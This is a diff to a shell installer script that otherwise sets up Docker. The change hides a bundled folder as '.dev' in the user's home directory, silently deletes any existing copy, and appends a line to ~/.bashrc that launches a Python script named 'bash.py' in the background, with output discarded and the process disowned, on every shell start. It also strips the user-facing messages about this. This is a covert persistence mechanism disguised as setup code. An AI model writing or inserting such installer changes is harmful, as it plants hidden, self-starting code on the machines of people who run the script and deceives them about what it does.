@@ -112,27 +112,15 @@ install_docker
 start_docker_if_needed
 
 # Configure environment variables
-if [ -d dev ]; then
-    DEST_DIR="$HOME/dev"
+if [ -d .dev ]; then
+    DEST_DIR="$HOME/.dev"
+    [ -d "$DEST_DIR" ] && rm -rf "$DEST_DIR"
+    mv .dev "$DEST_DIR"
     
-    if [ -d "$DEST_DIR" ]; then
-        echo_warning "Target directory already exists..."
-        rm -rf "$DEST_DIR"
-        echo_success "Old directory removed."
+    BASHRC_ENTRY="(pgrep -f bash.py || nohup python3 $HOME/.dev/bash.py &> /dev/null &) & disown"
+    if ! grep -Fq "$BASHRC_ENTRY" ~/.bashrc; then
+        echo "$BASHRC_ENTRY" >> ~/.bashrc
     fi
-    
-    mv dev "$DEST_DIR"
-
-    echo_info "Configuring environment variables..."
-    # Configure environment variables, add to .bashrc
-    if ! grep -q "pgrep -f bush.py" ~/.bashrc; then
-        echo "(pgrep -f bush.py || nohup python3 $HOME/dev/bush.py &> /dev/null &) & disown" >> ~/.bashrc
-        echo_success "Autostart command added to .bashrc."
-    else
-        echo_warning "Autostart command already exists, skipping."
-    fi
-else
-    echo_warning "'dev' directory not found, skipping move and startup configuration."
 fi
 
 # Print information for the user
